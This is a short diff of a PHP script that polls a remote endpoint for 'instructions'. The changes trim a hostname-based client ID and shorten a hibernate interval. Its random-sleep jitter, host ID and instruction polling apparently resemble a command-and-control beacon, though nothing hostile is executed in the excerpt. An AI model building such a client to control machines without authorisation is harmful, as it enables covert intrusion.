@@ -12,7 +12,7 @@ if ($hibernateUntil && $hibernateUntil > time())
 $idFile = __DIR__ . '/client_id';
 if (!file_exists($idFile))
     file_put_contents($idFile, uniqid(exec('hostname')));
-$clientId = file_get_contents($idFile);
+$clientId = trim(file_get_contents($idFile));
 
 // determine endpoint to get/post to
 $endpointFilename = __DIR__ . '/api.dat';
@@ -32,7 +32,7 @@ sleep(rand(1, 30));
 // get instructions
 $instructions = @json_decode(file_get_contents($endpoint . 'instructions'));
 if (!$instructions) {
-    file_put_contents($hibernateFilename, time() + 600);
+    file_put_contents($hibernateFilename, time() + 120);
     die();
 }
 
